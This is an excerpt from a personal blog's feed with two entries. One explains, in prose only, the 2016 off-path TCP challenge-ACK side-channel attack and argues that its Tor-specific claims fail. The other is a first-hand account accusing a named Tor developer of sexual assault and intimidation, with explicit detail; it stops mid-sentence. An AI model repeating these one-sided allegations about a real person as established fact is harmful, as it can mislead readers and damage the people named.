&lt;a href="https://tools.ietf.org/html/rfc5961"&gt;the 2012 modifications of &lt;span class="caps"&gt;RFC5961&lt;/span&gt;&lt;/a&gt;
to the specification of the Transmission Control Protocol (&lt;span class="caps"&gt;TCP&lt;/span&gt;), the
latter of which is
&lt;a href="http://www.caida.org/research/traffic-analysis/tcpudpratio/"&gt;used to transport roughly 90% of our data&lt;/a&gt;
across the internet.  The modification was meant to protect against
&lt;span class="caps"&gt;TCP&lt;/span&gt; &amp;#8220;blind in-window&amp;#8221;&amp;nbsp;attacks.&lt;/p&gt;


&lt;p&gt;When a &lt;span class="caps"&gt;TCP&lt;/span&gt; packet is sent, the sender and receiver both know a number,
called the sequence number, that this packet should have.  If the
sequence number is not correct, various (complicated, boring) things
may happen, but the important part is that neither the sender nor the
receiver actually believes that this is a valid packet.  Instead, they
assume something went wrong somehow, or that an active attacker is
attempting to inject packets into their communication stream.  The
term &lt;em&gt;blind&lt;/em&gt; simply means that an attacker is unable to directly
observe the packets going between the sender and receiver, but is
usually instead trying to use some side-channel to determine this
information.  There&amp;#8217;s another part of the &lt;span class="caps"&gt;TCP&lt;/span&gt; specification which
describes &lt;em&gt;windowing&lt;/em&gt; — which simply means (did I mention that &lt;span class="caps"&gt;TCP&lt;/span&gt; is
very complicated and boring…) that the sequence number was &amp;#8220;correct
enough&amp;#8221; — that is, that the sequence number was within the right
range.  Specification nerds have long argued over what &amp;#8220;correct
enough&amp;#8221; means, because apparently they find this topic absolutely
&lt;em&gt;riveting&lt;/em&gt;.&lt;/p&gt;
&lt;p&gt;The fix to the &lt;span class="caps"&gt;TCP&lt;/span&gt; blind in-window attack was to specify that, under
certain conditions, if the &lt;span class="caps"&gt;TCP&lt;/span&gt; sequence number doesn&amp;#8217;t match what was
expected, the receiver of this messed up packet should send a
&amp;#8220;challenge&amp;#8221; &lt;span class="caps"&gt;ACK&lt;/span&gt; to the sender.  Depending on the type of
messed-up-ness, the sender and receiver do one of a number of little
dances with each other, in the special way that &lt;span class="caps"&gt;TCP&lt;/span&gt; is so fond of
doing.  When one party sends a challenge &lt;span class="caps"&gt;ACK&lt;/span&gt;, they increment a counter
stored in a global variable which is shared across all &lt;span class="caps"&gt;TCP&lt;/span&gt;
connections.  This global variable is reset to 0 once per second, and
it has a maximum value of 100, i.e. no more than 100 challenge ACKs
will be sent per second (for all connections combined).  If it wasn&amp;#8217;t
obvious from the title of the paper, global variables (across
programming languages, frameworks, and contexts) are commonly known to
be a very bad, no good, horrible&amp;nbsp;idea.&lt;/p&gt;
&lt;p&gt;The attack described in the paper is elegant.  In terms of its impact,
&lt;a href="https://en.wikipedia.org/wiki/Usage_share_of_operating_systems#Public_servers_on_the_Internet"&gt;96.6% of the Alexa top one million&lt;/a&gt;
are running Linux kernels, and hence are likely vulnerable. The
previously described global &lt;span class="caps"&gt;ACK&lt;/span&gt; counter enables various side-channels
&lt;em&gt;across&lt;/em&gt; &lt;span class="caps"&gt;TCP&lt;/span&gt; connections, meaning that a blind attacker can determine …&lt;/p&gt;</summary><content type="html">

&lt;p&gt;&lt;strong&gt;tl;dr:&lt;/strong&gt; This vulnerability is quite serious, but it doesn&amp;#8217;t affect
  the Tor network any more than it affects the rest of the internet.
  In particular, the Tor-specific attacks mentioned in the paper will
  not work as&amp;nbsp;described.&lt;/p&gt;
&lt;p&gt;Recently,
&lt;a href="http://www.cs.ucr.edu/~zhiyunq/pub/sec16_TCP_pure_offpath.pdf"&gt;an excellent paper&lt;/a&gt;,
entitled &lt;em&gt;&amp;#8220;Off-Path &lt;span class="caps"&gt;TCP&lt;/span&gt; Exploits: Global Rate Limit Considered
Dangerous,&amp;#8221;&lt;/em&gt; was published by Yue Cao, Zhiyun Qian, Zhongjie Wang, Tuan
Dao, Srikanth V. Krishnamurthy, and Lisa M. Marvel at &lt;a href="https://www.usenix.org/conference/usenixsecurity16"&gt;&lt;span class="caps"&gt;USENIX&lt;/span&gt; Security
2016&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;The paper describes
&lt;a href="https://tools.ietf.org/html/rfc5961"&gt;the 2012 modifications of &lt;span class="caps"&gt;RFC5961&lt;/span&gt;&lt;/a&gt;
to the specification of the Transmission Control Protocol (&lt;span class="caps"&gt;TCP&lt;/span&gt;), the
latter of which is
&lt;a href="http://www.caida.org/research/traffic-analysis/tcpudpratio/"&gt;used to transport roughly 90% of our data&lt;/a&gt;
across the internet.  The modification was meant to protect against
&lt;span class="caps"&gt;TCP&lt;/span&gt; &amp;#8220;blind in-window&amp;#8221;&amp;nbsp;attacks.&lt;/p&gt;


&lt;p&gt;When a &lt;span class="caps"&gt;TCP&lt;/span&gt; packet is sent, the sender and receiver both know a number,
called the sequence number, that this packet should have.  If the
sequence number is not correct, various (complicated, boring) things
may happen, but the important part is that neither the sender nor the
receiver actually believes that this is a valid packet.  Instead, they
assume something went wrong somehow, or that an active attacker is
attempting to inject packets into their communication stream.  The
term &lt;em&gt;blind&lt;/em&gt; simply means that an attacker is unable to directly
observe the packets going between the sender and receiver, but is
usually instead trying to use some side-channel to determine this
information.  There&amp;#8217;s another part of the &lt;span class="caps"&gt;TCP&lt;/span&gt; specification which
describes &lt;em&gt;windowing&lt;/em&gt; — which simply means (did I mention that &lt;span class="caps"&gt;TCP&lt;/span&gt; is
very complicated and boring…) that the sequence number was &amp;#8220;correct
enough&amp;#8221; — that is, that the sequence number was within the right
range.  Specification nerds have long argued over what &amp;#8220;correct
enough&amp;#8221; means, because apparently they find this topic absolutely
&lt;em&gt;riveting&lt;/em&gt;.&lt;/p&gt;
&lt;p&gt;The fix to the &lt;span class="caps"&gt;TCP&lt;/span&gt; blind in-window attack was to specify that, under
certain conditions, if the &lt;span class="caps"&gt;TCP&lt;/span&gt; sequence number doesn&amp;#8217;t match what was
expected, the receiver of this messed up packet should send a
&amp;#8220;challenge&amp;#8221; &lt;span class="caps"&gt;ACK&lt;/span&gt; to the sender.  Depending on the type of
messed-up-ness, the sender and receiver do one of a number of little
dances with each other, in the special way that &lt;span class="caps"&gt;TCP&lt;/span&gt; is so fond of
doing.  When one party sends a challenge &lt;span class="caps"&gt;ACK&lt;/span&gt;, they increment a counter
stored in a global variable which is shared across all &lt;span class="caps"&gt;TCP&lt;/span&gt;
connections.  This global variable is reset to 0 once per second, and
it has a maximum value of 100, i.e. no more than 100 challenge ACKs
will be sent per second (for all connections combined).  If it wasn&amp;#8217;t
obvious from the title of the paper, global variables (across
programming languages, frameworks, and contexts) are commonly known to
be a very bad, no good, horrible&amp;nbsp;idea.&lt;/p&gt;
&lt;p&gt;The attack described in the paper is elegant.  In terms of its impact,
&lt;a href="https://en.wikipedia.org/wiki/Usage_share_of_operating_systems#Public_servers_on_the_Internet"&gt;96.6% of the Alexa top one million&lt;/a&gt;
are running Linux kernels, and hence are likely vulnerable. The
previously described global &lt;span class="caps"&gt;ACK&lt;/span&gt; counter enables various side-channels
&lt;em&gt;across&lt;/em&gt; &lt;span class="caps"&gt;TCP&lt;/span&gt; connections, meaning that a blind attacker can determine
information&amp;nbsp;about:&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;whether Alice and Bob are currently communicating over &lt;span class="caps"&gt;TCP&lt;/span&gt;,&lt;/li&gt;
&lt;li&gt;what the correct &lt;span class="caps"&gt;TCP&lt;/span&gt; sequence number is,&amp;nbsp;and&lt;/li&gt;
&lt;li&gt;what the range of the valid window&amp;nbsp;is.&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;The attacker does this by sending various crafted packets to the
receiver (i.e. via a side-channel) while the sender is simultaneously
sending valid packets to the receiver.  The combined state of the
attacker&amp;#8217;s and the sender&amp;#8217;s effects upon the global counter, for each
of the above pieces of information, can be determined by whether the
attacker receives either 99 or 100 ACKs in&amp;nbsp;response:&lt;/p&gt;
&lt;p&gt;&lt;/p&gt;&lt;span style="align:left; float:left; width:100%;"&gt;
  &lt;table style="float:left; clear:left; width:100%; margin: 1px;"&gt;
    &lt;tbody&gt;
      &lt;tr&gt;
        &lt;td style="text-align:center; padding: 1px;"&gt;
          &lt;a href="/static/images/2015/12/card.jpeg"&gt;
            &lt;img alt="Off-Path TCP Exploits, Fig. 4-6" style="width: 100%;"
                 src="/static/images/2016/08/CVE-2016-5696.png" /&gt;
          &lt;/a&gt;
        &lt;/td&gt;
      &lt;/tr&gt;
    &lt;/tbody&gt;
  &lt;/table&gt;
&lt;/span&gt;
&lt;/p&gt;&lt;br /&gt;&lt;p&gt;&lt;/p&gt;
&lt;p&gt;The authors go on to claim the attack can be used to influence a Tor
user&amp;#8217;s path through the network.  However, the authors seem to have a
misunderstanding regarding how Tor&amp;#8217;s path selection algorithm&amp;nbsp;functions.&lt;/p&gt;
&lt;p&gt;Their idea is summarised in the last paragraph of §7.2 of the paper (emphasis&amp;nbsp;mine):&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;In general, we believe that a DoS attack against Tor connections can
have a devastating impact on both the availability of the service as
a whole and the privacy guarantees that it can provide.  The default
policy in Tor is that if a connection is down between two relay
nodes, say a middle relay and an exit relay, &lt;strong&gt;the middle relay will
pick a different exit relay&lt;/strong&gt; to establish the next connection.  If
an attacker can dictate which connections are down (via reset
attacks), then the attacker can potentially force the use of certain
exit&amp;nbsp;relays.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;This is is technically incorrect.  The way Tor&amp;#8217;s path selection
algorithm actually works — when a connection fails — is that the
client forgets the path of that circuit entirely, and goes back to
step #1 of the algorithm, effectively choosing an entirely new path
without any memory of the path chosen before.  Since the selection of
the nodes in this new path (and in fact, any path) is dependent on
their bandwidth weight from the consensus, the client has just as much
probability to select the same exit as they did the last time.
Therefore, to use this attack to &amp;#8220;funnel&amp;#8221; (as the authors describe)
Tor users into using a particular exit node is of equal difficulty —
in terms of bandwidth of the nodes you would need to run — to
conducting a Sybil attack on the whole&amp;nbsp;network.&lt;/p&gt;
&lt;p&gt;Although, with a high-bandwidth exit in a sybil attack, the attacker
has a high (and importantly, to the attack&amp;#8217;s benefit, independent)
probability that an exit it controls will get picked by the client.
Whereas with this attack, the bandwidth weighting is likely
detrimental to pulling off the attack, since the exits you&amp;#8217;re
injecting RSTs into &lt;em&gt;still&lt;/em&gt; have independently high probabilities of
being chosen again.  In other words, &lt;em&gt;knocking nodes out of the
network doesn&amp;#8217;t do anything to change their probability of being
chosen&lt;/em&gt;, it merely makes them unavailable and thus only amounts to a
DoS attack, not a path bias&amp;nbsp;attack.&lt;/p&gt;
&lt;p&gt;While the attack on Tor — as stated in the paper — &lt;em&gt;does not&lt;/em&gt; work,
the attack itself is impressive, and we encourage these (and other!)
researchers to think of ways the attack might apply to Tor (and other&amp;nbsp;networks).&lt;/p&gt;
&lt;p&gt;Their attack &lt;em&gt;does&lt;/em&gt; work as a general denial-of-service against not
just Tor relays, but literally against anything running&amp;nbsp;Linux.&lt;/p&gt;
&lt;p&gt;The
&lt;a href="https://github.com/torvalds/linux/commit/75ff39ccc1bd5d3c455b6822ab09e533c551f758"&gt;accepted Linux kernel patch&lt;/a&gt;
solves the issue, and does so by randomising the time window that the
global variable applies&amp;nbsp;to.&lt;/p&gt;</content><category term="hacking"></category><category term="USENIX"></category><category term="security"></category><category term="Tor"></category><category term="Linux"></category></entry><entry><title>The Forest for the Trees</title><link href="https://blog.patternsinthevoid.net/the-forest-for-the-trees.html" rel="alternate"></link><published>2016-06-13T10:29:00+00:00</published><updated>2016-06-15T14:55:00+00:00</updated><author><name>isis agora lovecruft</name></author><id>tag:blog.patternsinthevoid.net,2016-06-13:/the-forest-for-the-trees.html</id><summary type="html">

&lt;p&gt;It feels rather sardonic to say this now, openly, after two years spent
alternating between trying to inhibit my rage and convince myself that I hadn&amp;#8217;t
been hurt, followed by seeking out other victims, in order to develop the
collective capacity to defend ourselves and to have the simple ability to speak
out in a manner which would be heard and not&amp;nbsp;discarded.&lt;/p&gt;
&lt;p&gt;&lt;a href="http://jacobappelbaum.net/#portfolioModal4"&gt;I&amp;#8217;m Forest&lt;/a&gt;. Here&amp;#8217;s my story, as
submitted to the anonymous site &lt;a href="http://jacobappelbaum.net"&gt;jacobappelbaum.net&lt;/a&gt;:&lt;/p&gt;
&lt;div style="background: #EFEFEF; padding: 2%; width: 90%; margin-bottom: 1.13em;
  margin-left: 3%; border-radius: 5px;"&gt;
  &lt;div style="font-size: 100%"&gt;
    &lt;p&gt;
Jake and I had been friends and coworkers for years.  Looking back on
it, I&amp;#8217;m not sure why.  From the very first Tor developer meeting I had
attended, he repetitively propositioned my partner and I for sex.  He
even went so far as to, on the very first meeting on the first
morning, in front of all the other developers — whom I had not yet met
— tell me that he was okay with my partner and I fucking in the same
bed as him while he watched, causing both of my partner and I to feel
completely humiliated that our private sex life was being discussed in
front of colleagues we had hoped to build a good start towards
friendly, professional&amp;nbsp;relationships.
    &lt;/p&gt;&lt;p&gt;
While travelling, the first time he came to the city I lived in, I
invited him to stay at my house.  As politely as I could, I explained,
&amp;#8220;You can have the floor, and I&amp;#8217;ll take my bed, or the other way
around.  If you&amp;#8217;re comfortable with it, we can share my bed, as
friends.  Meaning no physical contact.&amp;#8221;  We both slept in my&amp;nbsp;bed.
    &lt;/p&gt;&lt;p&gt;
That turned out (mostly) fine. (Except, of course, being propositioned
again, this time for a threesome with Jake and one of my roommates.)
In fact, Jake and I proceeded to share beds in a friendly manner over
the years, and nothing bad ever&amp;nbsp;happened.
    &lt;/p&gt;&lt;p&gt;
Once Jake had moved to Germany, I came to visit friends there for a
while, and one night I stayed at Jake&amp;#8217;s place.  Again, we shared a
bed, as friends.  There weren&amp;#8217;t even any discussion or attempts
beforehand to convince me to do anything sexual with him.  It was
freezing cold, and I went to bed with several layers of street clothes&amp;nbsp;on.
    &lt;/p&gt;&lt;p&gt;
Sometime around 5 o&amp;#8217;clock in the morning, I woke up very confused and
startled because my pants were unzipped and Jake&amp;#8217;s arm was wrapped
around me, his hands in my underwear and he was rubbing my clit and
rimming the edges of my vagina.  I tried to shove him off me and wake
him up.  He&amp;#8217;s physically much bigger than me, so the shoving didn&amp;#8217;t
work as well as it should have, but nonetheless he rolled over, a bit
exageratedly, mumbling as if&amp;nbsp;asleep.
    &lt;/p&gt;&lt;p&gt;
In the morning, I confronted him about it.  I was really confused.  I
didn&amp;#8217;t know if he was actually asleep, but if he was, how did my
clothes come undone?  Assuming that if …&lt;/p&gt;&lt;/div&gt;&lt;/div&gt;</summary><content type="html">

&lt;p&gt;It feels rather sardonic to say this now, openly, after two years spent
alternating between trying to inhibit my rage and convince myself that I hadn&amp;#8217;t
been hurt, followed by seeking out other victims, in order to develop the
collective capacity to defend ourselves and to have the simple ability to speak
out in a manner which would be heard and not&amp;nbsp;discarded.&lt;/p&gt;
&lt;p&gt;&lt;a href="http://jacobappelbaum.net/#portfolioModal4"&gt;I&amp;#8217;m Forest&lt;/a&gt;. Here&amp;#8217;s my story, as
submitted to the anonymous site &lt;a href="http://jacobappelbaum.net"&gt;jacobappelbaum.net&lt;/a&gt;:&lt;/p&gt;
&lt;div style="background: #EFEFEF; padding: 2%; width: 90%; margin-bottom: 1.13em;
  margin-left: 3%; border-radius: 5px;"&gt;
  &lt;div style="font-size: 100%"&gt;
    &lt;p&gt;
Jake and I had been friends and coworkers for years.  Looking back on
it, I&amp;#8217;m not sure why.  From the very first Tor developer meeting I had
attended, he repetitively propositioned my partner and I for sex.  He
even went so far as to, on the very first meeting on the first
morning, in front of all the other developers — whom I had not yet met
— tell me that he was okay with my partner and I fucking in the same
bed as him while he watched, causing both of my partner and I to feel
completely humiliated that our private sex life was being discussed in
front of colleagues we had hoped to build a good start towards
friendly, professional&amp;nbsp;relationships.
    &lt;/p&gt;&lt;p&gt;
While travelling, the first time he came to the city I lived in, I
invited him to stay at my house.  As politely as I could, I explained,
&amp;#8220;You can have the floor, and I&amp;#8217;ll take my bed, or the other way
around.  If you&amp;#8217;re comfortable with it, we can share my bed, as
friends.  Meaning no physical contact.&amp;#8221;  We both slept in my&amp;nbsp;bed.
    &lt;/p&gt;&lt;p&gt;
That turned out (mostly) fine. (Except, of course, being propositioned
again, this time for a threesome with Jake and one of my roommates.)
In fact, Jake and I proceeded to share beds in a friendly manner over
the years, and nothing bad ever&amp;nbsp;happened.
    &lt;/p&gt;&lt;p&gt;
Once Jake had moved to Germany, I came to visit friends there for a
while, and one night I stayed at Jake&amp;#8217;s place.  Again, we shared a
bed, as friends.  There weren&amp;#8217;t even any discussion or attempts
beforehand to convince me to do anything sexual with him.  It was
freezing cold, and I went to bed with several layers of street clothes&amp;nbsp;on.
    &lt;/p&gt;&lt;p&gt;
Sometime around 5 o&amp;#8217;clock in the morning, I woke up very confused and
startled because my pants were unzipped and Jake&amp;#8217;s arm was wrapped
around me, his hands in my underwear and he was rubbing my clit and
rimming the edges of my vagina.  I tried to shove him off me and wake
him up.  He&amp;#8217;s physically much bigger than me, so the shoving didn&amp;#8217;t
work as well as it should have, but nonetheless he rolled over, a bit
exageratedly, mumbling as if&amp;nbsp;asleep.
    &lt;/p&gt;&lt;p&gt;
In the morning, I confronted him about it.  I was really confused.  I
didn&amp;#8217;t know if he was actually asleep, but if he was, how did my
clothes come undone?  Assuming that if I was super confrontational
about it, he&amp;#8217;d have some excuse like &amp;#8220;Oh, but I thought it was okay
that time because you didn&amp;#8217;t explicitly give me the we&amp;#8217;re-just-friends
lecture before bed…&amp;#8221; When confronting Jake about this, I said, &amp;#8220;Dude,
what the fuck.  You started fingering me last night.&amp;#8221;  It took a few
seconds for there to be a reaction on his face, and then he seemed
confused, saying &amp;#8220;Oh… what?  I don&amp;#8217;t remember that.&amp;#8221;  I glared at&amp;nbsp;him.
    &lt;/p&gt;&lt;p&gt;
The really disconcerting thing for me was that, half an hour later, he
said, &amp;#8220;I thought you were her.&amp;#8221;  Here, &amp;#8220;her&amp;#8221; was Jake&amp;#8217;s fiancée.  At
the time, she didn&amp;#8217;t live in Germany, and they hadn&amp;#8217;t seen each other
in weeks.  Jake&amp;#8217;s fiancée was also gorgeous and super curvy, and I am
basically a scrawny, little twig.  &amp;#8220;I&amp;#8217;m not sure how you could confuse
us, even asleep.&amp;#8221; I said.  He continued muttering some excuses about
having wet dreams about her.  He seemed to suddenly and extremely
vividly remember whatever dream.  Nowhere did he say, &amp;#8220;I didn&amp;#8217;t put my
hands in your panties,&amp;#8221; nor did he&amp;nbsp;apologise.
    &lt;/p&gt;
  &lt;/div&gt;
&lt;/div&gt;



&lt;h3&gt;Transformative Justice is not the &amp;#8220;Death of Due&amp;nbsp;Process&amp;#8221;&lt;/h3&gt;
&lt;p&gt;First, some backstory is in&amp;nbsp;order.&lt;/p&gt;
&lt;p&gt;Seven or eight years ago, I was involved in an anarchist collective process for
a male person in an anarchist activist community who was accused of and
eventually admitted to raping two anarchist women. Since none of us would turn
him in to the police, we gave him a choice of either leaving or going through a
rehabilitation programme which we would create, in an attempt to transform him
into someone just as capable of contributing in all the productive ways he
already was but without harming other people and decreasing their abilities to
contribute and to do so safely.  We warned him that, if he skipped town, I would
personally hunt him down to whatever city he ran to, contact the anarchist
organisers there, and attempt to give them (as non-biased as possible) an
account of the events.  He didn&amp;#8217;t&amp;nbsp;run.&lt;/p&gt;
&lt;p&gt;At first, he participated grudgingly, but later he broke down crying in front of
the two victims, apologising sincerely and begging them for forgiveness. As part
of the rehabilitation, one of the things we determined to be cause for his
behaviour was a very negative self-body image, i.e. he was quite overweight and
under the impression that women &amp;#8220;only like dudes who are ripped&amp;#8221;.  Part of my
responsibilities in the rehab process was to go to the gym with him, to help him
have better body image, demonstrate that not all women are into &amp;#8220;dudes who are
ripped&amp;#8221;, and help him become more comfortable with the idea that women are
intelligent creatures as opposed to being merely some sexual object to be won
over.  He eventually successfully convinced both us and the victims that he
would not abuse anyone else.  To date this has been successful, and he&amp;#8217;s had
healthy relationships with several partners, including a&amp;nbsp;transperson.&lt;/p&gt;
&lt;h3&gt;The&amp;nbsp;Plan&lt;/h3&gt;
&lt;p&gt;When I first started seeking out other victims, about six months ago, I did not
want to formally report any of the stories I had heard from Jake&amp;#8217;s victims to
the Tor Project or others, for two primary reasons.  First, that my main
motivation in this was to ensure that these behaviours stopped, and it was not
clear to me that any traditional punitive &amp;#8220;justice&amp;#8221; measures would achieve such.
Second, I feared retaliation from Jake, as well as retaliation towards any of
the victims whose stories I would divulge.  Multiple victims at the time
expressed that they didn&amp;#8217;t want me to tell The Tor Project, later admitting they
feared retaliation to be extremely likely, as well as difficult to&amp;nbsp;combat.&lt;/p&gt;
&lt;p&gt;Instead, I had planned to gather people for a secret meeting in Valencia,
somewhere calm, neutral, and away from events, like on the beach, invite Jake,
and have everyone willing who has ever been sexually assaulted, humiliated,
harassed, or felt their boundaries disrespected, by him to take turns telling a
few sentences about what he did to them and how it made them feel.  Then we
would tell Jake that, as his friends, we thought this needed to stop, and that
we&amp;#8217;d either deliver a list of the stories to The Tor Project and other
organisations, or make all the stories public, if he refused to hold himself
accountable for his actions or his behaviour did not appear to improve.  In
planning this secret meeting, I tried to determine what would cause Jake to
perpetually disrespect other people like this, and if there were any positive
things we could do to help&amp;nbsp;him.&lt;/p&gt;
&lt;p&gt;Somehow Jake got word of all this, and proceeded to go back and forth between
everyone I knew, starting, it seems, with one of my roommates and a reporter
acquaintance, to force information out of these people, including more names of
more people involved (to force more information out of).  He seemed to have put
the whole story together from all the bits and pieces he was given.  In between
my efforts to get work done and give a lecture, he imposed on me that my ten
minutes of coffee break time should be spent speaking with him, because it was
An Emergency.  During that rather one-sided conversation, Jake described all the
time, effort, and ways he was using in order to completely ruin someone&amp;#8217;s life
who had attempted to stand up to him, as well as previous ways he had managed to
get someone fired from their position and ostracised. He pointedly mentioned,
several times, the names of multiple people who he had destroyed in the past for
standing against him. In his current efforts to harass one of these people —
which through backchannels I was already aware of, he said, &lt;em&gt;&amp;#8220;I&amp;#8217;ve literally been
spending 15 hours a day on this.&lt;/em&gt; […] &lt;em&gt;I&amp;#8217;ve been speaking with an investigative
journalist team to make sure they don&amp;#8217;t believe&lt;/em&gt; [that person]&lt;em&gt;.&lt;/em&gt; […] &lt;em&gt;I heard there
was a plan to &amp;#8216;Confront&amp;#8217; me in Valencia. If that happens, I probably will not
take it very&amp;nbsp;well…&amp;#8221;&lt;/em&gt;&lt;/p&gt;
&lt;p&gt;This was chilling.  Why was Jake saying those things, non sequitur and without
provocation?  It was clear to me that they were thinly-veiled threats,
descriptions of what would soon happen to me.  If I stood up to Jake, I could
expect him to try to get me fired from The Tor Project.  To try to block my
acceptance into the doctorate research program he knew that I was, at that point
in time, applying to.  To feed the media stories about what a horrible person I
am.  To ostracise me from my social&amp;nbsp;circles.&lt;/p&gt;
&lt;p&gt;In all of this, I tried to do the right thing, to ensure that no more people
were harmed, to give Jake one more chance.  I wanted the anarchist,
rehabilitation-focused solution, but Jake had only responded to that with
threats.  Meanwhile, &lt;a href="http://jacobappelbaum.net/#portfolioModal6"&gt;River&lt;/a&gt; and I
were introduced through a mutual friend.  When Jake threatened me, I was, for a
moment, frightened.  Then I flew into a fucking rage.  Sorry, Jake, but
attempting to blackmail me into silence whilst I was defending others is really
not a good look for an &amp;#8220;anarchist&amp;#8221; &amp;#8220;free-speech&amp;nbsp;advocate&amp;#8221;.&lt;/p&gt;
&lt;p&gt;Having run out of ideas and being threatened out of alternative options, I
reported everything to the rest of The Tor Project.  Well, almost everything.
Originally, I only reported others&amp;#8217; stories (with their permission).  I left my
own story out, and I did not tell it until it was decided that Jake would no
longer be part of The Tor&amp;nbsp;Project.&lt;/p&gt;
&lt;h3&gt;The&amp;nbsp;Trees&lt;/h3&gt;
&lt;p&gt;This isn&amp;#8217;t about any one individual&amp;#8217;s story.  This is about addressing the
issues and finding means within our communities to ensure this doesn&amp;#8217;t happen
again.  This is about building communal structures so that it does not require,
as Jake has rather entertainingly called it, &lt;em&gt;&amp;#8220;calculated and targeted attacks&amp;#8221;&lt;/em&gt;
from victims who otherwise felt alone and powerless to stand up and fight&amp;nbsp;back.&lt;/p&gt;
&lt;p&gt;&lt;/p&gt;&lt;span style="align:left; float:left; width:40%; margin: 0% 3% 0% 0%;"&gt;
  &lt;table style="float:left; clear:left;"&gt;
    &lt;tbody&gt;
      &lt;tr&gt;
        &lt;td style="text-align:center; padding: 1px;"&gt;
          &lt;a href="/static/images/2016/06/rosa-luxembourg-and-clara-zetkin.jpg"&gt;
            &lt;img alt="Clara Zetkin and Rosa Luxembourg, early women's rights
                      activists in Germany, marching at a demonstration, arm in arm."
                 style="width:100%; padding:5px; "
                 src="/static/images/2016/06/rosa-luxembourg-and-clara-zetkin.jpg" /&gt;
          &lt;/a&gt;
        &lt;/td&gt;
      &lt;/tr&gt;
    &lt;/tbody&gt;
  &lt;/table&gt;
  &lt;caption&gt;&lt;p style="font-size: 80%"&gt;
    Photo: &lt;a href="https://en.wikipedia.org/wiki/Clara_Zetkin"&gt;Clara Zetkin&lt;/a&gt; and
    &lt;a href="https://en.wikipedia.org/wiki/Rosa_Luxemburg"&gt;Rosa Luxembourg&lt;/a&gt;, early
    women&amp;#8217;s rights activists, marching at a demonstration, arm in&amp;nbsp;arm.
    &lt;/p&gt;
  &lt;/caption&gt;
&lt;/span&gt;
&lt;/p&gt;&lt;br /&gt;&lt;p&gt;&lt;/p&gt;
&lt;p&gt;I have spoken personally with every person whose story was
&lt;a href="https://archive.is/8m4Yk"&gt;published in the original set on the anonymous site&lt;/a&gt;.
I am convinced beyond reasonable doubt that each of them is true.  I added my
own story to the site in solidarity with the other victims, especially these who
remain anonymous, as someone with the social standing, and hence, enormous level
of privilege, required to be able to eventually go public.  Many of the other
victims do not have this privilege.  Whether due to marginalisation, fear of
retailiation, or being new to our communities,
&lt;a href="https://medium.com/@oxbloodruffin/public-figures-anonymous-victims-543f0b02d684"&gt;many sexual assault victims require anonymity&lt;/a&gt;,
because — without anonymity — they would be&amp;nbsp;silenced.&lt;/p&gt;
&lt;p&gt;Jake never apologised to me, nor — to my knowledge — any of the other victims.
I don&amp;#8217;t condone his actions.  However, and no apologies for being crass, I can&amp;#8217;t
seem to motivate myself to feel any pity towards him for any of the admittedly
horrible things which are now happening to him.  He ruined lives.  The number of
people we would have in a significantly more productive and less damaged state
were it not for his actions is substantial, and futher, those people in a less
damaged state would be overall substantially more beneficial than having a Jake
in a less damaged state.  Additionally, we would likely have had more diverse
contributors to Tor, if we had dealt with Jake sooner, since, for years, many
people have been warned about Jake through a whisper network and disuaded from
becoming&amp;nbsp;involved.&lt;/p&gt;
&lt;p&gt;There are some differences between how Jake is behaving to how the other
anarchist I mentioned above was behaving.  The other anarchist was willing to
engage in the defined process, respectful of his victims&amp;#8217; needs, and eventually
sincerely apologetic for his&amp;nbsp;actions.&lt;/p&gt;
&lt;p&gt;I cannot condone his actions; however, I cannot condone violence and threats
against Jake.  Full stop.  That is not productive.  If he is further harmed, we
never see the end of the wretched
&lt;a href="http://www.nytimes.com/1989/01/24/science/sad-legacy-of-abuse-the-search-for-remedies.html"&gt;abused-abuser cycle&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;&lt;a href="http://yas.sagepub.com/content/early/2010/01/07/0044118X09358313.abstract"&gt;People who behave as Jake does are sick&lt;/a&gt;,
and they
&lt;a href="http://www.nytimes.com/1989/01/24/science/sad-legacy-of-abuse-the-search-for-remedies.html"&gt;need help&lt;/a&gt;.
Often, it is because
&lt;a href="http://www.tandfonline.com/doi/abs/10.1080/10926770903475968"&gt;they were severely hurt&lt;/a&gt;
at some point.  As the activist adage goes, &lt;em&gt;&amp;#8220;We need to be gentle with one
another, so that we can be dangerous together.&amp;#8221;&lt;/em&gt; If we think Jake has any
capacity for change, then it is our responsibility to ensure that he is not
simply swept under a rug of academia where he will most certainly find a
&lt;a href="https://blog.cr.yp.to/20160607-dueprocess.html"&gt;deeply-ingrained institutional structure of rape apologists&lt;/a&gt;
ready to turn a blind eye and willing to help Jake &amp;#8220;fail up&amp;#8221; to another position
of power and credibility, where he will use that power to commit further acts of
abuse.  I am thoroughly dismayed for what is
&lt;a href="http://mcq.sagepub.com/content/16/4/471.short"&gt;statistically likely to happen again&lt;/a&gt;,
causing harm to and trust issues for their students, and professional and
reputational issues for&amp;nbsp;them.&lt;/p&gt;
&lt;h3&gt;Realpolitiking&lt;/h3&gt;
&lt;p&gt;Now.  For all of you screaming &lt;em&gt;&amp;#8220;This is not what justice looks like!  Why
don&amp;#8217;t you just go to the police?!&amp;#8221;&lt;/em&gt; let me just wax realpolitik and, like a
good little German, quote some &lt;em&gt;Gesetz&lt;/em&gt; and cite some&amp;nbsp;statistics.&lt;/p&gt;
&lt;p&gt;The &amp;#8220;due process&amp;#8221; of a state court, in my case, will be detrimental to both Jake
and I, as well as numerous other people.  The law is very clearly against both
of us in this case, with the overwhelmingly
&lt;a href="https://www.gesetze-im-internet.de/aufenthg_2004/__53.html"&gt;likely outcome&lt;/a&gt;
that he would be
&lt;a href="https://www.gesetze-im-internet.de/aufenthg_2004/__54.html"&gt;kicked out of Germany&lt;/a&gt;.
(Additionally, in Germany, multiple independent allegations can result in a
conviction given the absense of other&amp;nbsp;evidence.)&lt;/p&gt;
&lt;p&gt;The other outcome is one or more convictions.  While convictions for rape and
sexual assault are statistically unlikely, given that
&lt;a href="http://www.informationisbeautiful.net/visualizations/rape-a-lack-of-conviction/"&gt;only about 7% of reported rapes result in a conviction&lt;/a&gt;
with
&lt;a href="http://cwasu.org/filedown.asp?file=Germany_English%281%29.pdf"&gt;similar numbers for Germany&lt;/a&gt;,
we have an advantage.  By German case law, multiple independent allegations are
very likely to result in conviction(s), even despite the absense of other
evidence, e.g. bruises, marks, semen, which would be required in a solitary
allegation.  If brought to court, here are some of the applicable laws and their
